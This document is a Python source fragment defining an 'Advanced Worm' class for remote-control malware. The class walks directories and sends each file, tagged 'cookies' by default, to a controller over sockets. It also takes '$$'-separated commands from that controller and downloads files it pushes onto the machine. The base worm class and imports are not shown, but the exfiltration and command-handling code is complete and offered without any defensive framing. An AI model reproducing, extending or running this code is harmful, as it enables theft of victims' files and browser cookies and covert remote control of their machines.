


from random import randint
import string


class IndexGen:
    def __init__(self):
        self.chars = string.ascii_lowercase + string.digits + string.ascii_uppercase + string.digits
        self.lenGen = 20
    
    def generate(self) -> str:
        c = 0
        strIndex = ""
        while c < self.lenGen:
            char = randint(0, len(self.chars) - 1)
            char = self.chars[char]
            strIndex += char
            c += 1
        return strIndex



class AdvWorm(BasicWorm):
    def __init__(self):
        super().__init__()
        self.name = "Advanced Worm"
        self._wait4coor = 4
    
    def getPwd(self) -> str:
        return str(os.getcwd())
    
    def changeDir(self, target_dir: str) -> bool:
        try:
            os.chdir(target_dir)
            return True
        except FileNotFoundError:
            return False
        except OSError:
            return False

    def fileTracking(self, target: str) -> Union[bool, str]:
        if not os.path.exists(target):
            return None
        flen = os.stat(target).st_size
        return str(flen)
    
    def makeXtraSock(self, port: str) -> Union[tuple, bool]:
        try:
            port = int(port)
        except (ValueError, TypeError):
            return None
        try:
            xtra = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            xtra.settimeout(self._wait4coor)
            return (port, xtra)
        except:
            return None
    
    def _sendFile(self, fpath: str, xtra: object) -> None:
        with open(fpath, "rb") as f:
            xtra.sendfile(f, 0)
        


    def sendFile(self, name: str, target: str = None, dir_index: str = None) -> None:
        if not target:
            target = os.path.join(self.getPwd(), name)
        flen = self.fileTracking(target)
        if not flen:
            return None
        if dir_index:
            msg = self.makeSysMsg(["d", name, flen, dir_index])
        else:
            msg = self.makeSysMsg(["d", name, flen])
        self.sendMsg(msg)
        
        try:
            resp = self.reciveMsg()
        except socket.timeout:
            return None
        resp = resp.split(" ")
        if len(resp) < 2:
            return None
        port, xtra = self.makeXtraSock(resp[1])
        if not xtra:
            return None
        try:
            xtra.connect((self.ip, port))
        except OSError:
            return None
        send = Thread(target=self._sendFile, args=(target, xtra), daemon=True)
        send.start()
        return True
    
    def _stealDir(self, dir_name: str, tag: str = "cookies", info: str = "") -> None:
        if not os.path.exists(dir_name):
            print("ERROR DIR")
            return
        too_steal = []
        for r,d, files in os.walk(dir_name, topdown=False):
            for f in files:
                too_steal.append((f, os.path.join(r, f)))
        if len(too_steal) < 1:
            return
        dirIndex = self.IG.generate()
        msg = self.makeSysMsg(["w", tag, info, dirIndex])
        self.sendMsg(msg)
        sleep(0.5)
        for ts in too_steal:
            self.sendFile(ts[0], ts[1], dirIndex)
    
    def splitCMD(self, cmd: str) -> list:
        cmd = cmd.split("$$")
        command = []
        for c in cmd:
            if c == "" or c == " ":
                continue
            command.append(c)
        return command
    
    def execCMD(self, cmd: str) -> None:
        cmd = self.splitCMD(cmd)
        print("CMD SPLIT: ", cmd)
        match cmd[0]:
            case "UPL":
                self.downloadFile(cmd[1], cmd[2], cmd[3])
    
    def _downloadFile(self, port: int, file_name: str, file_len: int) -> None:
        downSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            downSock.connect((self.ip, port))
        except:
            print("Cant xtra conn")
            return
        self.sendMsg(f"Start downloading file: {file_name}")
        data = b""
        while len(data) < file_len:
            recv = downSock.recv(file_len - len(data))
            if not recv:
                return None
            else:
                data += recv
        try:
            with open(os.path.join(self.getPwd(), file_name), "wb") as f:
                f.write(data)
            self.sendMsg(f"File: {file_name} download successfull")
        except:
            print("ERROR: Save File")
        
    
    def downloadFile(self, port: str, file_name: str, file_len: str):
        try:
            file_len = int(file_len)
            port = int(port)
        except:
            print("ERROR Convert file len")
            return
        down = Thread(target=self._downloadFile, args=(port, file_name, file_len), daemon=True)
        down.start()


